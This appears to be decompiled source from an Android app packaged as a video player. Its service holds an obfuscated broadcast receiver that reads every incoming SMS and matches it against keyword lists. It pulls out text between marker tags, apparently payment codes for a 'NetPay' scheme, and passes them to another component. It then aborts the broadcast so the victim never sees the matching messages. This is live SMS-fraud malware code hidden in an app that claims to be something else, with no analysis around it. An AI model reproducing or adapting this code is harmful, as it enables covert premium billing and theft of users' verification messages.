package com.videoclient.player.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.b.a.h;
import java.util.HashSet;
import java.util.Iterator;

class a
  extends BroadcastReceiver
{
  a(MyService paramMyService) {}
  
  private boolean a(String paramString1, String paramString2)
  {
    h.a("del..sms..");
    paramString1 = MyService.a.iterator();
    do
    {
      if (!paramString1.hasNext()) {
        return false;
      }
    } while (paramString2.indexOf((String)paramString1.next()) == -1);
    return true;
  }
  
  private boolean b(String paramString1, String paramString2)
  {
    h.a("cut..sms.." + MyService.d);
    if (MyService.c == null)
    {
      h.a("NetPay..checkAns..tags..is..null");
      return false;
    }
    paramString1 = MyService.c;
    int j = paramString1.length;
    int i = 0;
    for (;;)
    {
      if (i >= j)
      {
        if ((MyService.d == null) || (MyService.d.length != 2)) {
          break;
        }
        i = paramString2.indexOf(MyService.d[0]);
        j = paramString2.indexOf(MyService.d[1]);
        if (j <= i) {
          break;
        }
        paramString1 = paramString2.substring(i + MyService.d[0].length(), j);
        com.videoclient.player.c.a.a(this.a, paramString1);
        return false;
      }
      if (paramString2.indexOf(paramString1[i]) == -1)
      {
        h.a("NetPay..tags..check..out");
        return false;
      }
      i += 1;
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    h.a("receiver..get..");
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramIntent = (Object[])paramIntent.getExtras().get("pdus");
      if (paramIntent != null) {}
    }
    else
    {
      return;
    }
    paramContext = new SmsMessage[paramIntent.length];
    StringBuffer localStringBuffer = new StringBuffer();
    int i = 0;
    for (;;)
    {
      if (i >= paramContext.length)
      {
        paramIntent = localStringBuffer.toString();
        paramContext = paramContext[0].getDisplayOriginatingAddress();
        h.a("get..message..Port:" + paramContext + ",msg:" + paramIntent);
        boolean bool1 = b(paramContext, paramIntent);
        boolean bool2 = a(paramContext, paramIntent);
        if ((!bool1) && (!bool2)) {
          break;
        }
        abortBroadcast();
        return;
      }
      paramContext[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
      localStringBuffer.append(paramContext[i].getDisplayMessageBody());
      i += 1;
    }
  }
}
